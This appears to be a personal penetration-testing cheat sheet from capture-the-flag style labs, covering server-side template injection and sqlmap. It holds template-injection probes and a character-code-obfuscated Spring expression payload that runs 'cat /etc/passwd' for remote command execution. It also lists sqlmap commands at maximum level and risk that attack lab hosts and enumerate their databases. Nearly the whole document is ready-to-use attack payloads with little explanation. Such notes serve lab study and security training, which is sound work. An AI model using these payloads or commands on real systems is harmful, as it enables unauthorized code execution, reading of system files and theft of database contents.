
### SSTI 

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

> {T(java.lang.System).getenv()}

Get /etc/passwd
> ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}

### sqlmap

--level=5 highest level
--risk=3 highest level 
--batch - run without asking any questions

> sqlmap -u http://10.10.11.170:8080/ --batch

> sqlmap -u http://10.10.11.170:8080/stats?author=woodenk --level=5 --risk=3 --batch

Post enumeration through form fields
> sqlmap -u http://shoppy.htb/login --data="username=field1&password=field2" --level=5 --risk=3 --batch --ignore-code 401 



Enumerate databases
> sqlmap -u http://10.10.11.170:8080 --level=5 --risk=3 --batch --dbs
